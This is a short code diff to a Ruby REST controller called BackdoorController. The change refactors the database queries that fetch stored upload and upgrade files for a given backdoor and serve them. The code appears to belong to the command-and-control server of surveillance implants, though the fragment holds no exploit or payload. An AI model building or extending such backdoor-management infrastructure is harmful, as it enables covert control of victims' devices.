@@ -96,8 +96,8 @@ class BackdoorController < RESTController
     case @req_method
       when 'GET'
         backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
-        upload = backdoor.upload_requests.find(conditions: { _id: request['upload_id']}).first
-        content = GridFS.instance.get upload[:_grid]
+        upl = backdoor.upload_requests.where({ _id: request['upload_id']}).first
+        content = GridFS.instance.get upl[:_grid].first
         trace :info, "[#{@req_peer}] Requested the UPLOAD #{request} -- #{content.file_length.to_s_bytes}"
         return STATUS_OK, content.read, content.content_type
       when 'DELETE'
@@ -128,8 +128,8 @@ class BackdoorController < RESTController
     case @req_method
       when 'GET'
         backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
-        upgrade = backdoor.upgrade_requests.find(conditions: { _id: request['upgrade_id']}).first
-        content = GridFS.instance.get upgrade[:_grid]
+        upgr = backdoor.upgrade_requests.where({ _id: request['upgrade_id']}).first
+        content = GridFS.instance.get upgr[:_grid].first
         trace :info, "[#{@req_peer}] Requested the UPGRADE #{request} -- #{content.file_length.to_s_bytes}"
         return STATUS_OK, content.read, content.content_type
       when 'DELETE'
